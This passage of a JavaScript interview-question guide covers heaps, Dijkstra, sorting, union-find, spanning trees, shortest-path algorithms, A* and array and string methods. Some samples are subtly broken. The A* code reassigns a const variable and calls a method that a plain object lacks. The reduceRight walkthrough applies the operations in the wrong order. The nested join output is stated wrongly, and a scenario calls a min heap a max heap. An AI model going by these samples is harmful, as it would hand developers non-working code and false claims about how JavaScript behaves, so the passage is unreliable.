A task scheduler needed to always process the highest priority task. Using a max heap allowed O(1) access to the maximum priority task and O(log n) insertion/removal. The system could handle thousands of tasks efficiently, always processing the most important ones first.

#### Example Code
```js
// Min Heap:
class MinHeap {
  constructor() {
    this.heap = [];
  }
  
  getParentIndex(i) {
    return Math.floor((i - 1) / 2);
  }
  
  getLeftChildIndex(i) {
    return 2 * i + 1;
  }
  
  getRightChildIndex(i) {
    return 2 * i + 2;
  }
  
  swap(i, j) {
    [this.heap[i], this.heap[j]] = [this.heap[j], this.heap[i]];
  }
  
  insert(value) {
    this.heap.push(value);
    this.bubbleUp(this.heap.length - 1);
  }
  
  bubbleUp(index) {
    while (index > 0) {
      const parentIndex = this.getParentIndex(index);
      if (this.heap[parentIndex] <= this.heap[index]) break;
      this.swap(parentIndex, index);
      index = parentIndex;
    }
  }
  
  extractMin() {
    if (this.heap.length === 0) return null;
    if (this.heap.length === 1) return this.heap.pop();
    
    const min = this.heap[0];
    this.heap[0] = this.heap.pop();
    this.bubbleDown(0);
    return min;
  }
  
  bubbleDown(index) {
    while (true) {
      let smallest = index;
      const left = this.getLeftChildIndex(index);
      const right = this.getRightChildIndex(index);
      
      if (left < this.heap.length && this.heap[left] < this.heap[smallest]) {
        smallest = left;
      }
      
      if (right < this.heap.length && this.heap[right] < this.heap[smallest]) {
        smallest = right;
      }
      
      if (smallest === index) break;
      this.swap(index, smallest);
      index = smallest;
    }
  }
  
  peek() {
    return this.heap[0] || null;
  }
  
  size() {
    return this.heap.length;
  }
}

// Usage:
const heap = new MinHeap();
heap.insert(10);
heap.insert(5);
heap.insert(15);
heap.insert(3);

console.log(heap.extractMin());  // 3
console.log(heap.extractMin());  // 5
console.log(heap.extractMin());  // 10
console.log(heap.extractMin());  // 15
```

---

### Question 150: How do you implement Dijkstra's shortest path algorithm?

#### Definition
Dijkstra's algorithm finds the shortest path from a start node to all other nodes in a weighted graph. Like finding the fastest route on a map with different road speeds. Uses a priority queue to always process the closest unvisited node first. Guarantees finding shortest paths when all edge weights are non-negative.

#### Real-World Scenario / Case Study
A navigation system needed to find shortest routes between locations. Dijkstra's algorithm provided optimal paths considering road distances and speeds. The system could calculate routes for thousands of locations efficiently, enabling real-time navigation.

#### Example Code
```js
class PriorityQueue {
  constructor() {
    this.values = [];
  }
  
  enqueue(val, priority) {
    this.values.push({ val, priority });
    this.sort();
  }
  
  dequeue() {
    return this.values.shift();
  }
  
  sort() {
    this.values.sort((a, b) => a.priority - b.priority);
  }
}

class WeightedGraph {
  constructor() {
    this.adjacencyList = {};
  }
  
  addVertex(vertex) {
    if (!this.adjacencyList[vertex]) {
      this.adjacencyList[vertex] = [];
    }
  }
  
  addEdge(vertex1, vertex2, weight) {
    this.adjacencyList[vertex1].push({ node: vertex2, weight });
    this.adjacencyList[vertex2].push({ node: vertex1, weight });
  }
  
  Dijkstra(start, finish) {
    const nodes = new PriorityQueue();
    const distances = {};
    const previous = {};
    const path = [];
    let smallest;
    
    // Build initial state:
    for (let vertex in this.adjacencyList) {
      if (vertex === start) {
        distances[vertex] = 0;
        nodes.enqueue(vertex, 0);
      } else {
        distances[vertex] = Infinity;
        nodes.enqueue(vertex, Infinity);
      }
      previous[vertex] = null;
    }
    
    // As long as there's something to visit:
    while (nodes.values.length) {
      smallest = nodes.dequeue().val;
      
      if (smallest === finish) {
        // Build path:
        while (previous[smallest]) {
          path.push(smallest);
          smallest = previous[smallest];
        }
        break;
      }
      
      if (smallest || distances[smallest] !== Infinity) {
        for (let neighbor in this.adjacencyList[smallest]) {
          const nextNode = this.adjacencyList[smallest][neighbor];
          const candidate = distances[smallest] + nextNode.weight;
          const nextNeighbor = nextNode.node;
          
          if (candidate < distances[nextNeighbor]) {
            distances[nextNeighbor] = candidate;
            previous[nextNeighbor] = smallest;
            nodes.enqueue(nextNeighbor, candidate);
          }
        }
      }
    }
    
    return path.concat(smallest).reverse();
  }
}

// Usage:
const graph = new WeightedGraph();
graph.addVertex('A');
graph.addVertex('B');
graph.addVertex('C');
graph.addVertex('D');
graph.addEdge('A', 'B', 4);
graph.addEdge('A', 'C', 2);
graph.addEdge('B', 'C', 1);
graph.addEdge('B', 'D', 5);
graph.addEdge('C', 'D', 8);

console.log(graph.Dijkstra('A', 'D'));  // ['A', 'C', 'B', 'D'] (shortest path)
```

---

### Question 151: How do you implement a bubble sort algorithm?

#### Definition
Bubble sort repeatedly steps through the list, compares adjacent elements, and swaps them if they're in wrong order. Like bubbles rising to the surface - larger elements "bubble up" to the end. Simple but inefficient (O(n²)). Useful for educational purposes or very small datasets. Not practical for large arrays.

#### Real-World Scenario / Case Study
A developer implemented bubble sort for sorting 10,000 items, causing 5+ second delays. The O(n²) complexity made it unsuitable. Switching to quicksort reduced sort time to 50ms. The team learned when simple algorithms are appropriate vs when optimized ones are needed.

#### Example Code
```js
// Bubble sort:
function bubbleSort(arr) {
  const n = arr.length;
  
  for (let i = 0; i < n - 1; i++) {
    let swapped = false;
    
    for (let j = 0; j < n - i - 1; j++) {
      if (arr[j] > arr[j + 1]) {
        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
        swapped = true;
      }
    }
    
    // Optimization: if no swaps, array is sorted
    if (!swapped) break;
  }
  
  return arr;
}

// Usage:
const arr = [64, 34, 25, 12, 22, 11, 90];
console.log(bubbleSort([...arr]));  // [11, 12, 22, 25, 34, 64, 90]

// Recursive version:
function bubbleSortRecursive(arr, n = arr.length) {
  if (n === 1) return arr;
  
  for (let i = 0; i < n - 1; i++) {
    if (arr[i] > arr[i + 1]) {
      [arr[i], arr[i + 1]] = [arr[i + 1], arr[i]];
    }
  }
  
  return bubbleSortRecursive(arr, n - 1);
}
```

---

### Question 152: What is the difference between `Array.prototype.find()` and `Array.prototype.findIndex()`?

#### Definition
`find` returns the first element that matches the condition, or `undefined` if none found. `findIndex` returns the index of the first matching element, or `-1` if none found. Use `find` when you need the element itself, `findIndex` when you need its position. Both stop at the first match (short-circuit).

#### Real-World Scenario / Case Study
Code was using `findIndex` then accessing the array again with the index, which was inefficient. Using `find` directly eliminated the extra array access. The code became cleaner and slightly more performant.

#### Example Code
```js
const users = [
  { id: 1, name: 'John', active: true },
  { id: 2, name: 'Jane', active: false },
  { id: 3, name: 'Bob', active: true }
];

// find - returns element:
const user = users.find(u => u.id === 2);
console.log(user);  // { id: 2, name: 'Jane', active: false }

const notFound = users.find(u => u.id === 999);
console.log(notFound);  // undefined

// findIndex - returns index:
const index = users.findIndex(u => u.id === 2);
console.log(index);  // 1

const notFoundIndex = users.findIndex(u => u.id === 999);
console.log(notFoundIndex);  // -1

// When to use which:
// Need the element:
const activeUser = users.find(u => u.active);  // Direct access

// Need the index:
const activeIndex = users.findIndex(u => u.active);
if (activeIndex !== -1) {
  users[activeIndex].lastSeen = Date.now();  // Update by index
}

// Both short-circuit (stop at first match):
users.find(u => {
  console.log('Checking:', u.name);
  return u.active;
});
// Only logs until first active user found
```

---

### Question 153: How do you implement an insertion sort algorithm?

#### Definition
Insertion sort builds the sorted array one item at a time, like sorting playing cards in your hand. It takes each element and inserts it into its correct position among the already sorted elements. Efficient for small datasets or nearly sorted arrays. O(n²) worst case, but O(n) for nearly sorted data.

#### Real-World Scenario / Case Study
A system received mostly sorted data that occasionally had a few out-of-order items. Using quicksort was overkill. Insertion sort's O(n) performance on nearly sorted data made it perfect. Sort time dropped from 100ms to 5ms for this use case.

#### Example Code
```js
// Insertion sort:
function insertionSort(arr) {
  for (let i = 1; i < arr.length; i++) {
    const key = arr[i];
    let j = i - 1;
    
    // Move elements greater than key one position ahead
    while (j >= 0 && arr[j] > key) {
      arr[j + 1] = arr[j];
      j--;
    }
    
    arr[j + 1] = key;
  }
  
  return arr;
}

// Usage:
const arr = [64, 34, 25, 12, 22, 11, 90];
console.log(insertionSort([...arr]));  // [11, 12, 22, 25, 34, 64, 90]

// With comparator:
function insertionSortWithComparator(arr, compare = (a, b) => a - b) {
  for (let i = 1; i < arr.length; i++) {
    const key = arr[i];
    let j = i - 1;
    
    while (j >= 0 && compare(arr[j], key) > 0) {
      arr[j + 1] = arr[j];
      j--;
    }
    
    arr[j + 1] = key;
  }
  
  return arr;
}

// Nearly sorted data (best case - O(n)):
const nearlySorted = [1, 2, 3, 5, 4, 6, 7, 8];
insertionSort(nearlySorted);  // Very fast!
```

---

### Question 154: What is the difference between `String.prototype.replace()` and `String.prototype.replaceAll()`?

#### Definition
`replace` replaces the first occurrence (or all with global regex flag). `replaceAll` replaces all occurrences without needing a global flag. `replaceAll` is simpler when you want to replace all instances of a string. Use `replace` for single replacements or when using regex patterns, `replaceAll` for simple string replacements of all occurrences.

#### Real-World Scenario / Case Study
Code was using `replace` with a loop to replace all occurrences of a string, which was verbose and error-prone. Switching to `replaceAll` simplified the code. The team also discovered `replaceAll` handles special regex characters differently, fixing a bug where dots weren't being replaced correctly.

#### Example Code
```js
const text = 'Hello world, hello universe';

// replace - first occurrence only:
const replaced1 = text.replace('hello', 'hi');
console.log(replaced1);  // 'Hello world, hi universe' (case-sensitive, first only)

// replace with global flag (regex):
const replaced2 = text.replace(/hello/gi, 'hi');
console.log(replaced2);  // 'hi world, hi universe' (case-insensitive, all)

// replaceAll - all occurrences:
const replaced3 = text.replaceAll('hello', 'hi');
console.log(replaced3);  // 'Hello world, hi universe' (case-sensitive)

// replaceAll with case-insensitive (needs regex):
const replaced4 = text.replaceAll(/hello/gi, 'hi');
console.log(replaced4);  // 'hi world, hi universe'

// Important: replaceAll with string escapes special regex chars:
const text2 = 'a.b.c';
text2.replaceAll('.', '-');  // 'a-b-c' (treats . as literal)
text2.replace(/\./g, '-');   // 'a-b-c' (needs escape with regex)

// replaceAll requires global flag if using regex:
text.replaceAll(/hello/i, 'hi');  // Error: must have global flag
text.replaceAll(/hello/gi, 'hi'); // OK
```

---

### Question 155: How do you implement a selection sort algorithm?

#### Definition
Selection sort finds the minimum element and swaps it with the first unsorted element, repeatedly. Like finding the smallest card and putting it first, then the next smallest, etc. Simple but inefficient (O(n²)). Always makes the same number of comparisons regardless of data order. Useful for educational purposes.

#### Real-World Scenario / Case Study
A developer chose selection sort for a sorting task, not realizing its O(n²) complexity. With 50,000 items, sorting took 10+ seconds. Switching to merge sort reduced time to 200ms. The team learned to consider algorithm complexity for production code.

#### Example Code
```js
// Selection sort:
function selectionSort(arr) {
  for (let i = 0; i < arr.length - 1; i++) {
    let minIndex = i;
    
    // Find minimum in unsorted portion:
    for (let j = i + 1; j < arr.length; j++) {
      if (arr[j] < arr[minIndex]) {
        minIndex = j;
      }
    }
    
    // Swap if minimum is not at current position:
    if (minIndex !== i) {
      [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];
    }
  }
  
  return arr;
}

// Usage:
const arr = [64, 25, 12, 22, 11];
console.log(selectionSort([...arr]));  // [11, 12, 22, 25, 64]

// With comparator:
function selectionSortWithComparator(arr, compare = (a, b) => a - b) {
  for (let i = 0; i < arr.length - 1; i++) {
    let minIndex = i;
    
    for (let j = i + 1; j < arr.length; j++) {
      if (compare(arr[j], arr[minIndex]) < 0) {
        minIndex = j;
      }
    }
    
    if (minIndex !== i) {
      [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];
    }
  }
  
  return arr;
}
```

---

### Question 156: What is the difference between `Array.prototype.concat()` and the spread operator?

#### Definition
Both combine arrays, but `concat` is a method that can take multiple arguments (arrays or values), while spread is an operator that spreads array elements. Spread is more flexible and can be used in more contexts (function arguments, object literals). `concat` always returns a new array, spread creates new arrays/objects. Spread is generally preferred in modern code.

#### Real-World Scenario / Case Study
Code was using `concat` in many places, which was verbose. Switching to spread operator made the code more concise and consistent with modern JavaScript patterns. The team also used spread in object literals and function calls, making the codebase more uniform.

#### Example Code
```js
const arr1 = [1, 2, 3];
const arr2 = [4, 5, 6];

// concat - method:
const combined1 = arr1.concat(arr2);
console.log(combined1);  // [1, 2, 3, 4, 5, 6]

// concat with multiple arrays:
const arr3 = [7, 8];
const combined2 = arr1.concat(arr2, arr3);
console.log(combined2);  // [1, 2, 3, 4, 5, 6, 7, 8]

// concat with values:
const combined3 = arr1.concat(4, 5);
console.log(combined3);  // [1, 2, 3, 4, 5]

// Spread operator:
const combined4 = [...arr1, ...arr2];
console.log(combined4);  // [1, 2, 3, 4, 5, 6]

// Spread with multiple arrays:
const combined5 = [...arr1, ...arr2, ...arr3];
console.log(combined5);  // [1, 2, 3, 4, 5, 6, 7, 8]

// Spread with values:
const combined6 = [...arr1, 4, 5];
console.log(combined6);  // [1, 2, 3, 4, 5]

// Spread is more flexible:
const newArray = [0, ...arr1, 3.5, ...arr2, 9];
// Can insert elements anywhere

// concat always appends:
const newArray2 = [0].concat(arr1).concat([3.5]).concat(arr2).concat([9]);
// More verbose
```

---

### Question 157: How do you implement a topological sort algorithm?

#### Definition
Topological sort orders nodes in a directed acyclic graph (DAG) such that for every edge u→v, u comes before v. Like ordering tasks where some must be done before others - you can't build a roof before the walls. Useful for task scheduling, dependency resolution, build systems. Uses DFS or Kahn's algorithm (BFS-based).

#### Real-World Scenario / Case Study
A build system needed to determine the correct order to compile modules based on dependencies. Topological sort provided the correct build order, ensuring dependencies were built before dependents. The system could handle complex dependency graphs and detect circular dependencies.

#### Example Code
```js
// Topological sort using DFS:
function topologicalSort(graph) {
  const visited = new Set();
  const result = [];
  
  function dfs(node) {
    if (visited.has(node)) return;
    
    visited.add(node);
    
    // Visit all neighbors first:
    for (const neighbor of graph[node] || []) {
      dfs(neighbor);
    }
    
    // Add to result after visiting neighbors (post-order):
    result.push(node);
  }
  
  // Visit all nodes:
  for (const node in graph) {
    if (!visited.has(node)) {
      dfs(node);
    }
  }
  
  return result.reverse();  // Reverse for correct order
}

// Kahn's algorithm (BFS-based):
function topologicalSortKahn(graph) {
  const inDegree = {};
  const queue = [];
  const result = [];
  
  // Calculate in-degrees:
  for (const node in graph) {
    inDegree[node] = 0;
  }
  
  for (const node in graph) {
    for (const neighbor of graph[node] || []) {
      inDegree[neighbor] = (inDegree[neighbor] || 0) + 1;
    }
  }
  
  // Find nodes with no incoming edges:
  for (const node in inDegree) {
    if (inDegree[node] === 0) {
      queue.push(node);
    }
  }
  
  // Process nodes:
  while (queue.length > 0) {
    const node = queue.shift();
    result.push(node);
    
    for (const neighbor of graph[node] || []) {
      inDegree[neighbor]--;
      if (inDegree[neighbor] === 0) {
        queue.push(neighbor);
      }
    }
  }
  
  // Check for cycles:
  if (result.length !== Object.keys(graph).length) {
    throw new Error('Cycle detected in graph');
  }
  
  return result;
}

// Usage:
const graph = {
  A: ['B', 'C'],
  B: ['D'],
  C: ['D'],
  D: []
};

console.log(topologicalSort(graph));  // ['A', 'B', 'C', 'D'] or ['A', 'C', 'B', 'D']
```

---

### Question 158: What is the difference between `Object.hasOwnProperty()` and the `in` operator?

#### Definition
`hasOwnProperty` checks if an object has its own property (not inherited). The `in` operator checks if a property exists anywhere in the prototype chain. `hasOwnProperty` is like checking your own pockets, `in` checks your pockets and your parents' pockets. Use `hasOwnProperty` when you only care about own properties, `in` when you want to check the entire chain.

#### Real-World Scenario / Case Study
Code was using `in` to check for properties, but it was matching inherited properties from prototypes, causing bugs. Switching to `hasOwnProperty` or `Object.hasOwnProperty()` (safer) fixed the issue by only checking own properties.

#### Example Code
```js
const obj = { name: 'John' };

// hasOwnProperty - only own properties:
console.log(obj.hasOwnProperty('name'));     // true
console.log(obj.hasOwnProperty('toString')); // false (inherited)

// in operator - checks prototype chain:
console.log('name' in obj);     // true
console.log('toString' in obj); // true (inherited from Object.prototype)

// Problem with hasOwnProperty - can be overridden:
const obj2 = {
  hasOwnProperty: function() { return false; },
  name: 'John'
};
obj2.hasOwnProperty('name');  // false (overridden!)

// Safer - use Object.prototype.hasOwnProperty:
Object.prototype.hasOwnProperty.call(obj2, 'name');  // true

// Or use Object.hasOwn (ES2022):
Object.hasOwn(obj2, 'name');  // true (modern, safe)

// When to use which:
// Check own property:
if (obj.hasOwnProperty('name')) { }  // or Object.hasOwn(obj, 'name')

// Check anywhere in chain:
if ('toString' in obj) { }  // true (inherited)

// Iterate own properties:
for (let key in obj) {
  if (obj.hasOwnProperty(key)) {
    console.log(key);  // Only 'name'
  }
}
```

---

### Question 159: How do you implement a union-find (disjoint set) data structure?

#### Definition
Union-Find tracks disjoint sets and supports two operations: union (merge two sets) and find (which set an element belongs to). Like grouping people into teams - you can merge teams and check if two people are on the same team. Uses path compression and union by rank for efficiency. Useful for connectivity problems, Kruskal's algorithm.

#### Real-World Scenario / Case Study
A network connectivity system needed to check if nodes were connected and merge connected components. Union-Find provided O(α(n)) amortized operations (nearly constant). The system could handle millions of nodes efficiently, enabling real-time connectivity checks.

#### Example Code
```js
class UnionFind {
  constructor(size) {
    this.parent = Array.from({ length: size }, (_, i) => i);
    this.rank = new Array(size).fill(0);
  }
  
  find(x) {
    // Path compression:
    if (this.parent[x] !== x) {
      this.parent[x] = this.find(this.parent[x]);
    }
    return this.parent[x];
  }
  
  union(x, y) {
    const rootX = this.find(x);
    const rootY = this.find(y);
    
    if (rootX === rootY) return;  // Already in same set
    
    // Union by rank:
    if (this.rank[rootX] < this.rank[rootY]) {
      this.parent[rootX] = rootY;
    } else if (this.rank[rootX] > this.rank[rootY]) {
      this.parent[rootY] = rootX;
    } else {
      this.parent[rootY] = rootX;
      this.rank[rootX]++;
    }
  }
  
  connected(x, y) {
    return this.find(x) === this.find(y);
  }
}

// Usage:
const uf = new UnionFind(5);
uf.union(0, 1);
uf.union(2, 3);
uf.union(1, 4);

console.log(uf.connected(0, 4));  // true (0-1-4 connected)
console.log(uf.connected(2, 3));  // true
console.log(uf.connected(0, 2));  // false
```

---

### Question 160: What is the difference between `Array.prototype.every()` and `Array.prototype.some()`?

#### Definition
`every` returns true only if ALL elements pass the test - like checking if everyone passed an exam. `some` returns true if AT LEAST ONE element passes - like checking if anyone passed. Both short-circuit: `every` stops at first failure, `some` stops at first success. Use `every` for "all must be true", `some` for "at least one is true".

#### Real-World Scenario / Case Study
Code was using `filter().length === array.length` to check if all users were active, which processed all elements. Using `every()` stopped at the first inactive user, improving performance. Similarly, `some()` was faster than `find()` !== undefined for existence checks.

#### Example Code
```js
const numbers = [2, 4, 6, 8, 10];

// every - all must pass:
const allEven = numbers.every(n => n % 2 === 0);
console.log(allEven);  // true

const allPositive = numbers.every(n => n > 0);
console.log(allPositive);  // true

// some - at least one must pass:
const hasOdd = numbers.some(n => n % 2 === 1);
console.log(hasOdd);  // false

const hasLarge = numbers.some(n => n > 5);
console.log(hasLarge);  // true

// Short-circuiting:
numbers.every(n => {
  console.log('Checking:', n);
  return n < 5;
});
// Stops at 6 (first failure)

numbers.some(n => {
  console.log('Checking:', n);
  return n > 5;
});
// Stops at 6 (first success)

// Common patterns:
// Check if all users are active:
const allActive = users.every(u => u.active);

// Check if any user is admin:
const hasAdmin = users.some(u => u.role === 'admin');

// vs inefficient alternatives:
const allActive2 = users.filter(u => u.active).length === users.length;  // Processes all
const hasAdmin2 = users.find(u => u.role === 'admin') !== undefined;     // Processes until found
```

---

### Question 161: How do you implement a Kruskal's algorithm for minimum spanning tree?

#### Definition
Kruskal's algorithm finds the minimum spanning tree (MST) of a weighted graph - the tree connecting all nodes with minimum total weight. Like finding the cheapest way to connect all cities with roads. It sorts edges by weight, then adds them if they don't create a cycle. Uses Union-Find to detect cycles efficiently.

#### Real-World Scenario / Case Study
A network design system needed to connect all nodes with minimum cable cost. Kruskal's algorithm found the optimal network topology. The system saved 30% on infrastructure costs compared to naive approaches, while ensuring all nodes remained connected.

#### Example Code
```js
class UnionFind {
  constructor(size) {
    this.parent = Array.from({ length: size }, (_, i) => i);
  }
  
  find(x) {
    if (this.parent[x] !== x) {
      this.parent[x] = this.find(this.parent[x]);
    }
    return this.parent[x];
  }
  
  union(x, y) {
    this.parent[this.find(x)] = this.find(y);
  }
}

function kruskal(vertices, edges) {
  // Sort edges by weight:
  edges.sort((a, b) => a.weight - b.weight);
  
  const uf = new UnionFind(vertices.length);
  const mst = [];
  
  for (const edge of edges) {
    const root1 = uf.find(edge.from);
    const root2 = uf.find(edge.to);
    
    // If not in same set, add edge (no cycle):
    if (root1 !== root2) {
      uf.union(root1, root2);
      mst.push(edge);
      
      // MST has V-1 edges:
      if (mst.length === vertices.length - 1) break;
    }
  }
  
  return mst;
}

// Usage:
const vertices = ['A', 'B', 'C', 'D'];
const edges = [
  { from: 0, to: 1, weight: 4 },
  { from: 0, to: 2, weight: 2 },
  { from: 1, to: 2, weight: 1 },
  { from: 1, to: 3, weight: 5 },
  { from: 2, to: 3, weight: 8 }
];

const mst = kruskal(vertices, edges);
console.log(mst);  // Minimum spanning tree edges
```

---

### Question 162: What is the difference between `Array.prototype.reduce()` and `Array.prototype.reduceRight()`?

#### Definition
Both combine array elements into a single value, but `reduce` processes left-to-right (start to end) while `reduceRight` processes right-to-left (end to start). Like reading a sentence forward vs backward. `reduceRight` is useful when order matters, like processing operations that need to happen in reverse order or building strings from right to left.

#### Real-World Scenario / Case Study
A calculator was processing operations left-to-right, but needed right-to-left for correct mathematical precedence. Using `reduceRight` allowed processing operations in the correct order, fixing calculation bugs. The code became clearer about the processing direction.

#### Example Code
```js
const numbers = [1, 2, 3, 4];

// reduce - left to right:
const sum = numbers.reduce((acc, val) => acc + val, 0);
// 0 + 1 = 1, 1 + 2 = 3, 3 + 3 = 6, 6 + 4 = 10

// reduceRight - right to left:
const sumRight = numbers.reduceRight((acc, val) => acc + val, 0);
// 0 + 4 = 4, 4 + 3 = 7, 7 + 2 = 9, 9 + 1 = 10

// When order matters:
const operations = [
  { type: 'divide', value: 2 },
  { type: 'multiply', value: 3 },
  { type: 'add', value: 5 }
];

// Process right to left (like math):
const result = operations.reduceRight((acc, op) => {
  switch (op.type) {
    case 'add': return acc + op.value;
    case 'multiply': return acc * op.value;
    case 'divide': return acc / op.value;
  }
}, 10);
// 10 / 2 = 5, 5 * 3 = 15, 15 + 5 = 20

// Building strings:
const words = ['world', 'hello'];
const sentence1 = words.reduce((acc, word) => acc + ' ' + word);
// 'world hello'

const sentence2 = words.reduceRight((acc, word) => acc + ' ' + word);
// 'hello world' (reversed order)
```

---

### Question 163: How do you implement a Floyd-Warshall algorithm for all-pairs shortest paths?

#### Definition
Floyd-Warshall finds shortest paths between all pairs of nodes in a weighted graph. Like having a complete distance table between all cities. Uses dynamic programming - considers all possible intermediate nodes. O(n³) complexity but finds all paths in one go. Useful when you need shortest paths between many pairs.

#### Real-World Scenario / Case Study
A routing system needed shortest paths between all location pairs. Running Dijkstra for each pair was too slow. Floyd-Warshall computed all pairs at once, enabling instant route calculations for any origin-destination pair. The system could handle 1000+ locations efficiently.

#### Example Code
```js
function floydWarshall(graph) {
  const n = graph.length;
  const dist = graph.map(row => [...row]);  // Copy graph
  
  // Initialize: dist[i][j] = graph[i][j] or Infinity
  for (let i = 0; i < n; i++) {
    for (let j = 0; j < n; j++) {
      if (i !== j && dist[i][j] === 0) {
        dist[i][j] = Infinity;
      }
    }
  }
  
  // Consider each vertex as intermediate:
  for (let k = 0; k < n; k++) {
    for (let i = 0; i < n; i++) {
      for (let j = 0; j < n; j++) {
        // If going through k is shorter:
        if (dist[i][k] + dist[k][j] < dist[i][j]) {
          dist[i][j] = dist[i][k] + dist[k][j];
        }
      }
    }
  }
  
  return dist;
}

// Usage:
// Graph: 4 nodes, adjacency matrix
const graph = [
  [0, 3, Infinity, 7],
  [8, 0, 2, Infinity],
  [5, Infinity, 0, 1],
  [2, Infinity, Infinity, 0]
];

const shortestPaths = floydWarshall(graph);
// shortestPaths[i][j] = shortest distance from i to j
```

---

### Question 164: What is the difference between `String.prototype.trim()`, `trimStart()`, and `trimEnd()`?

#### Definition
`trim` removes whitespace from both ends of a string - like trimming both ends of a ribbon. `trimStart` (or `trimLeft`) removes whitespace only from the beginning. `trimEnd` (or `trimRight`) removes whitespace only from the end. Use `trim` when you want both sides clean, the others when you only need one side.

#### Real-World Scenario / Case Study
A form was trimming user input, but some fields needed to preserve leading spaces (like indented code). Using `trimEnd()` preserved leading spaces while removing trailing ones. This fixed validation issues where leading spaces were meaningful.

#### Example Code
```js
const text = '  Hello World  ';

// trim - both ends:
console.log(text.trim());        // 'Hello World'

// trimStart (or trimLeft) - beginning only:
console.log(text.trimStart());   // 'Hello World  '
console.log(text.trimLeft());    // 'Hello World  ' (alias)

// trimEnd (or trimRight) - end only:
console.log(text.trimEnd());     // '  Hello World'
console.log(text.trimRight());    // '  Hello World' (alias)

// What counts as whitespace:
const text2 = '\t\n  Hello  \n\t';
console.log(text2.trim());  // 'Hello' (removes tabs, newlines, spaces)

// Common use cases:
// User input - remove all whitespace:
const userInput = '  john@example.com  ';
const email = userInput.trim();  // 'john@example.com'

// Preserve leading spaces:
const code = '    function test() {';
const cleaned = code.trimEnd();  // Keeps indentation

// Remove only trailing:
const path = '/users/john/  ';
const cleanPath = path.trimEnd();  // '/users/john/'
```

---

### Question 165: How do you implement a Bellman-Ford algorithm for shortest paths?

#### Definition
Bellman-Ford finds shortest paths from a source to all nodes, even with negative edge weights (unlike Dijkstra). Like finding routes that might have tolls (negative) that actually save money. Can detect negative cycles. Slower than Dijkstra (O(VE)) but more versatile. Relaxes edges V-1 times, then checks for negative cycles.

#### Real-World Scenario / Case Study
A financial system needed to find optimal transaction paths where some edges had negative costs (rebates, discounts). Dijkstra couldn't handle negative weights. Bellman-Ford found optimal paths and detected arbitrage opportunities (negative cycles) that could be exploited.

#### Example Code
```js
function bellmanFord(graph, source) {
  const V = graph.length;
  const dist = new Array(V).fill(Infinity);
  dist[source] = 0;
  
  // Relax edges V-1 times:
  for (let i = 0; i < V - 1; i++) {
    for (let u = 0; u < V; u++) {
      for (const edge of graph[u] || []) {
        const { v, weight } = edge;
        if (dist[u] !== Infinity && dist[u] + weight < dist[v]) {
          dist[v] = dist[u] + weight;
        }
      }
    }
  }
  
  // Check for negative cycles:
  for (let u = 0; u < V; u++) {
    for (const edge of graph[u] || []) {
      const { v, weight } = edge;
      if (dist[u] !== Infinity && dist[u] + weight < dist[v]) {
        throw new Error('Negative cycle detected');
      }
    }
  }
  
  return dist;
}

// Usage:
// Graph: adjacency list with negative weights allowed
const graph = [
  [{ v: 1, weight: 4 }, { v: 2, weight: 5 }],
  [{ v: 2, weight: -3 }],
  [{ v: 3, weight: 2 }],
  []
];

const distances = bellmanFord(graph, 0);
// distances[i] = shortest distance from source to node i
```

---

### Question 166: What is the difference between `Array.prototype.join()` and `Array.prototype.toString()`?

#### Definition
Both convert arrays to strings, but `join` lets you specify the separator (default is comma), while `toString` always uses commas. `join` is more flexible - you can use any separator or empty string. `toString` is simpler when you just need comma-separated values. Use `join` when you need control over the separator.

#### Real-World Scenario / Case Study
Code was using `toString()` to create CSV data, but couldn't customize the separator. Switching to `join(',')` made the intent clearer. Later, the team needed tab-separated values and easily changed to `join('\t')`, demonstrating `join`'s flexibility.

#### Example Code
```js
const arr = ['a', 'b', 'c'];

// toString - always comma-separated:
console.log(arr.toString());  // 'a,b,c'

// join - customizable separator:
console.log(arr.join());      // 'a,b,c' (default comma)
console.log(arr.join(','));   // 'a,b,c'
console.log(arr.join('-'));   // 'a-b-c'
console.log(arr.join(' '));   // 'a b c'
console.log(arr.join(''));    // 'abc' (no separator)

// Common use cases:
// CSV:
const data = ['John', 'Doe', '30'];
const csv = data.join(',');  // 'John,Doe,30'

// Path:
const pathParts = ['users', 'john', 'documents'];
const path = '/' + pathParts.join('/');  // '/users/john/documents'

// Sentence:
const words = ['Hello', 'world'];
const sentence = words.join(' ') + '!';  // 'Hello world!'

// toString on nested arrays:
const nested = [1, [2, 3], 4];
console.log(nested.toString());  // '1,2,3,4' (flattens)
console.log(nested.join('-'));   // '1,2,3-4' (doesn't flatten)
```

---

### Question 167: How do you implement a A* search algorithm?

#### Definition
A* is a pathfinding algorithm that finds the shortest path using heuristics (educated guesses). Like having a GPS that estimates distance to destination. Combines actual distance traveled (g) with estimated distance remaining (h). More efficient than Dijkstra when you have a good heuristic. Uses priority queue prioritizing f(n) = g(n) + h(n).

#### Real-World Scenario / Case Study
A game needed pathfinding for characters. Dijkstra explored too many nodes. A* with Manhattan distance heuristic found optimal paths 10x faster by focusing search toward the goal. The game ran smoothly even with hundreds of characters pathfinding simultaneously.

#### Example Code
```js
class PriorityQueue {
  constructor() {
    this.values = [];
  }
  
  enqueue(val, priority) {
    this.values.push({ val, priority });
    this.sort();
  }
  
  dequeue() {
    return this.values.shift();
  }
  
  sort() {
    this.values.sort((a, b) => a.priority - b.priority);
  }
  
  isEmpty() {
    return this.values.length === 0;
  }
}

function aStar(graph, start, goal, heuristic) {
  const openSet = new PriorityQueue();
  openSet.enqueue(start, 0);
  
  const cameFrom = {};
  const gScore = { [start]: 0 };
  const fScore = { [start]: heuristic(start, goal) };
  
  while (!openSet.isEmpty()) {
    const current = openSet.dequeue().val;
    
    if (current === goal) {
      // Reconstruct path:
      const path = [current];
      while (current in cameFrom) {
        current = cameFrom[current];
        path.unshift(current);
      }
      return path;
    }
    
    for (const neighbor of graph[current] || []) {
      const tentativeG = gScore[current] + graph.getWeight(current, neighbor);
      
      if (!(neighbor in gScore) || tentativeG < gScore[neighbor]) {
        cameFrom[neighbor] = current;
        gScore[neighbor] = tentativeG;
        fScore[neighbor] = tentativeG + heuristic(neighbor, goal);
        
        if (!openSet.values.find(v => v.val === neighbor)) {
          openSet.enqueue(neighbor, fScore[neighbor]);
        }
      }
    }
  }
  
  return null;  // No path found
}

// Manhattan distance heuristic (for grid):
function manhattan(a, b) {
  return Math.abs(a.x - b.x) + Math.abs(a.y - b.y);
}
```

---

### Question 168: What is the difference between `Array.prototype.reverse()` and creating a reversed copy?

#### Definition
